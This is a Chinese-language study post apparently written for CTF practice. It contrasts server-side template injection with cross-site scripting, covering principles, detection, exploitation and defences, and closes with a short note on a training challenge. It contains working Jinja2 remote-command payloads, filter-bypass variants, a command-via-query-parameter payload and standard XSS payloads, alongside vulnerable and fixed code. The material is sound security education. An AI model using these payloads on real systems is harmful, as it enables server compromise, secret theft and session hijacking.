---
about-SSTI-XSS
date: 2026-11-02
categories: 学习
excerpt:SSTI 是服务端模板注入，代码在服务器上执行
---

**SSTI（Server-Side Template Injection，服务端模板注入）**：用户输入被当成“模板代码”交给模板引擎执行，而不是当成普通数据。

它和 XSS 的区别：

- **XSS**：代码在受害者浏览器里执行。
- **SSTI**：代码在服务器上执行，可能读文件、读环境变量、连数据库，甚至执行系统命令。

# 一、结论对比

| 维度         | SSTI                               | XSS                           |
| ------------ | ---------------------------------- | ----------------------------- |
| 全称         | Server-Side Template Injection     | Cross-Site Scripting          |
| 执行位置     | 服务器                             | 浏览器                        |
| 被解释的内容 | 模板表达式                         | HTML / JavaScript             |
| 典型引擎     | Jinja2、Twig、FreeMarker、Velocity | 浏览器 HTML 解析器、JS 引擎   |
| 探测 payload | `{{7*7}}` → `49`                   | `<script>alert(1)</script>`   |
| 主要危害     | 读文件、读配置、RCE                | 盗会话、CSRF、钓鱼、篡改页面  |
| 根本修复     | 不把用户输入当模板                 | 上下文输出编码、CSP、安全 API |
| 典型场景     | Flask/Jinja2 错误页、邮件模板      | 评论、搜索回显、后台管理页    |

------

# 二、SSTI 是什么

## 1. 原理

模板引擎本来是让开发者写“模板”的：

html

```
<h1>Hello {{ name }}</h1>
```

`{{ name }}` 是变量，引擎会把 `name` 的值填进去。

正常写法：

python

```
return render_template("hello.html", name=user_input)
```

这里用户输入只是**数据**，即使输入：

代码块

```
{{7*7}}
```

页面也只会显示：

代码块

```
{{7*7}}
```

危险写法：

python

```
return render_template_string(
    f"<h1>Hello {user_input}</h1>"
)
```

这里用户输入被拼进了**模板源码**。
如果输入：

代码块

```
{{7*7}}
```

模板引擎会把它当 **表达式执行**  ，输出：

代码块

```
49
```

这就是 SSTI啦

------

## 2. 为什么危险

模板表达式不只是能做算术，还能访问 Python 对象。

Jinja2 里常见利用链：

代码块

```
{{cycler.__init__.__globals__.os.popen('id').read()}}
```

拆开看：

- `cycler`：Jinja2 `cycler`：提供的一个全局对象；

  <details>
  <summary>leave it to myself</summary>
  <p>Jinja2 是 Python/Flask 使用的模板引擎，负责把“模板 + 数据”渲染成 HTML。</p>
  <p>它本身不是漏洞；当用户输入被拼进模板源码并被 <code>render_template_string</code> 编译时，才会形成 SSTI。</p>
  </details>

- `cycler.__init__`：它的初始化函数；
- `__init__.__globals__`：这个函数所在模块的全局命名空间；

- 里面能找到 `os` 模块；
- `os.popen()` 执行系统命令；
- `.read()` 读取命令输出。

于是 SSTI 从“模板注入”升级成了 **RCE（远程命令执行）**。

除了命令执行，还可以：

代码块

```
{{config}}
```

泄露 Flask 配置，例如 `SECRET_KEY`。

还可以读文件、读环境变量、连数据库、横向移动。

------

## 3. SSTI 怎么发现

找“用户输入被服务端模板处理”的地方，然后输入表达式。

常见探测：

| payload      | 可能对应的引擎         |
| ------------ | ---------------------- |
| `{{7*7}}`    | Jinja2、Twig、Nunjucks |
| `${7*7}`     | JSP EL、FreeMarker     |
| `<%= 7*7 %>` | ERB、EJS               |
| `#{7*7}`     | Ruby、某些 Java 模板   |
| `*{7*7}`     | Thymeleaf              |

如果页面返回 `49`，说明表达式被执行了。

进一步判断 Jinja2：

代码块

```
{{7*'7'}}
```

Python 里字符串乘法会得到：

代码块

```
7777777
```

这比单纯 `7*7` 更能说明是 Python/Jinja2。

------

## 4. SSTI 的利用思路

### 第一步：确认注入

代码块

```
{{7*7}}  → 49
```

### 第二步：找对象链

Jinja2 常见全局对象：

代码块

```
{{cycler}}
{{lipsum}}
{{namespace}}
{{request}}
```

常见链：

代码块

```
{{cycler.__init__.__globals__.os.popen('id').read()}}
{{lipsum.__globals__.os.popen('id').read()}}
{{namespace.__init__.__globals__.os.popen('id').read()}}
{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
```

### 第三步：读文件或执行命令

代码块

```
{{cycler.__init__.__globals__.os.popen('ls -la /').read()}}
{{cycler.__init__.__globals__.os.popen('cat /flag').read()}}
```

### 第四步：如果被过滤

常见绕过：

代码块

```
{{cycler.__init__.__globals__['o'+'s'].popen('id').read()}}
```

代码块

```
{{cycler|attr('__init__')|attr('__globals__')|attr('__getitem__')('os')|attr('popen')('id')|attr('read')()}}
```

也可以把命令放到请求参数里：

代码块

```
{{cycler.__init__.__globals__.os.popen(request.args.cmd).read()}}
```

访问：

代码块

```
/?cmd=id
```

------

## 5.  SSTI 题的例子

访问不存在的路径：

代码块

```
/abc
```

页面显示：

代码块

```
Path /abc does not exist
```

说明路径被回显。

访问：

代码块

```
/{{7*7}}
```

显示：

代码块

```
Path /49 does not exist
```

说明 `request.path` 被拼进模板源码，Jinja2 执行了 `{{7*7}}`。

漏洞代码大概类似：

python

```
@app.errorhandler(404)
def not_found(e):
    return render_template_string(
        f"<p>Path {request.path} does not exist</p>"
    ), 404
```

正确写法：

python

```
return render_template("404.html", path=request.path), 404
```

模板里：

html

```
<p>Path {{ path }} does not exist</p>
```

这样 `path` 只是变量，不会被当代码执行。

------

## 6. SSTI 的防御

核心原则：

> **永远不要把用户输入拼进模板源码。**

正确做法：

python

```
return render_template("page.html", content=user_input)
```

如果必须动态模板：

1. 使用沙箱化模板环境；
2. 只允许白名单变量和函数；
3. 不暴露 `os`、`subprocess`、`__globals__` 等危险对象；
4. 不要用 root 运行 Web 服务；
5. WAF 只能作为辅助，不能作为根本修复。

------

# 三、XSS 是什么

## 1. 原理

XSS 是攻击者把恶意 JavaScript 注入到网页里，让**其他用户的浏览器**执行。

正常页面：

html

```
<p>欢迎，张三</p>
```

如果服务端直接把用户输入拼进 HTML：

python

```
return f"<p>欢迎，{name}</p>"
```

用户输入：

html

```
<script>alert(1)</script>
```

浏览器收到：

html

```
<p>欢迎，<script>alert(1)</script></p>
```

浏览器会把它当 JavaScript 执行。

这就是 XSS。

------

## 2. XSS 的三种类型

### （1）反射型 XSS

恶意 payload 来自当前请求，服务端立刻把它反射到响应里。

例如搜索页：

代码块

```
/search?q=<script>alert(1)</script>
```

服务端返回：

html

```
<p>你搜索的是：<script>alert(1)</script></p>
```

浏览器执行。

特点：

- 不会存储；
- 需要诱导受害者点击恶意链接；
- 常见于搜索、错误页、跳转参数。

------

### （2）存储型 XSS

payload 被存进数据库，其他用户访问页面时触发。

例如评论：

html

```
<img src=x onerror="alert(1)">
```

评论被保存，管理员打开后台审核时执行。

特点：

- 危害最大；
- 不需要受害者点击特定链接；
- 常见于评论、留言、用户名、工单、日志、后台管理页。

CTF 里的“admin bot 访问你的评论”通常就是存储型 XSS。

------

### （3）DOM 型 XSS

服务端可能完全没参与，问题出在前端 JavaScript。

例如：

javascript

```
document.getElementById("out").innerHTML = location.hash.slice(1);
```

访问：

代码块

```
/page#<img src=x onerror=alert(1)>
```

`innerHTML` 把 hash 内容当 HTML 解析，触发 `onerror`。

特点：

- 数据流在浏览器里完成；
- 服务端日志可能看不到 payload；
- 常见危险点：
  - `innerHTML`
  - `document.write`
  - `eval`
  - `setTimeout(string)`
  - `location`
  - `element.setAttribute("href", ...)`

安全写法：

javascript

```
document.getElementById("out").textContent = location.hash.slice(1);
```

`textContent` 只当文本，不解析 HTML。

------

## 3. XSS 的常见 payload

最基础：

html

```
<script>alert(1)</script>
```

事件处理器：

html

```
<img src=x onerror=alert(1)>
```

SVG：

html

```
<svg onload=alert(1)>
```

链接：

html

```
<a href="javascript:alert(1)">点我</a>
```

属性闭合：

html

```
"><img src=x onerror=alert(1)">
```

注意：

- XSS 不一定需要 `<script>`；
- 现代浏览器对 `innerHTML` 插入的 `<script>` 可能不执行，但事件处理器如 `onerror` 仍可能执行；
- 具体能不能触发，取决于输出上下文和浏览器解析。

------

## 4. XSS 的危害

- 窃取 Cookie（如果没设 `HttpOnly`）；
- 以受害者身份发请求，执行 CSRF；
- 读取页面上的敏感信息；
- 修改页面内容、钓鱼；
- 记录键盘输入；
- 在后台管理员页面执行操作；
- worm 式传播。

即使 Cookie 设置了 `HttpOnly`，XSS 仍然可以：

- 以用户身份发请求；
- 读取页面 DOM；
- 偷 CSRF token；
- 修改页面；
- 发起钓鱼。

所以 `HttpOnly` 只能缓解“偷 Cookie”，不能根治 XSS。

------

## 5. XSS 的防御

核心原则：

> **根据输出上下文做编码，不要相信任何用户输入。**

### （1）HTML 文本上下文

把 `<`、`>`、`&`、`"`、`'` 转义：

代码块

```
<script> → &lt;script&gt;
```

### （2）HTML 属性上下文

属性值要加引号，并转义：

html

```
<input value="用户输入">
```

### （3）JavaScript 上下文

不要直接拼：

javascript

```
var name = "<?= user_input ?>";
```

应该用 JSON 序列化：

javascript

```
var name = <?= json_encode(user_input) ?>;
```

### （4）URL 上下文

使用 `encodeURIComponent`，并校验协议，禁止 `javascript:`。

### （5）使用安全 API

不要用：

javascript

```
element.innerHTML = userInput;
```

用：

javascript

```
element.textContent = userInput;
```

React 的 `dangerouslySetInnerHTML`、Vue 的 `v-html` 都是危险入口，除非内容已经过严格清洗。

### （6）富文本清洗

如果业务必须允许 HTML，使用 DOMPurify 等白名单清洗库，不要自己写正则。

### （7）CSP

http

```
Content-Security-Policy: default-src 'self'; script-src 'self'
```

CSP 可以降低 XSS 影响，但不能替代输出编码。

### （8）Cookie 安全属性

http

```
Set-Cookie: session=...; HttpOnly; Secure; SameSite=Lax
```

------

# 四、SSTI 和 XSS 的关系

## 1. 它们不是一回事

- SSTI：服务器执行模板代码；
- XSS：浏览器执行 JavaScript。

SSTI 可以读服务器文件、执行系统命令；
XSS 不能直接读服务器文件，但能操作受害者浏览器。

## 2. SSTI 可以导致 XSS

如果模板注入的输出是 HTML，攻击者可以插入：

代码块

```
{{'<script>alert(1)</script>'}}
```

服务端渲染后，浏览器可能执行。

但这不是 XSS 作为根因，而是 SSTI 产生的 HTML 又触发了 XSS。

## 3. XSS 不能直接变成 SSTI

XSS 在浏览器里执行，无法直接让服务器模板引擎执行代码。
除非它进一步利用其他服务端漏洞。

## 4. 记忆方法

代码块

```
SSTI：输入 → 服务端模板引擎 → 执行 → 返回 HTML
XSS：输入 → 服务端/前端写入 HTML → 浏览器 JS 引擎 → 执行
```

------

# 五、JNCTF训练赛

## 模拟宇宙 1

- 404 页面把 `request.path` 拼进 `render_template_string`；
- `{{7*7}}` 返回 `49`；
- 这是 **SSTI**；
- 利用 Jinja2 对象链执行命令。

------

# 六、最后总结

| 问题          | 答案                                    |
| ------------- | --------------------------------------- |
| SSTI 是什么   | 用户输入被当成服务端模板代码执行        |
| XSS 是什么    | 用户输入被当成浏览器 HTML/JS 执行       |
| SSTI 在哪执行 | 服务器                                  |
| XSS 在哪执行  | 浏览器                                  |
| SSTI 能干什么 | 读文件、读配置、RCE                     |
| XSS 能干什么  | 盗会话、CSRF、钓鱼、篡改页面            |
| SSTI 怎么防   | 不把输入拼进模板，使用变量和沙箱        |
| XSS 怎么防    | 上下文输出编码、安全 API、CSP、HttpOnly |
| 共同点        | 都是注入，都是“把数据当代码”            |
| 最大区别      | 一个在服务端，一个在客户端              |
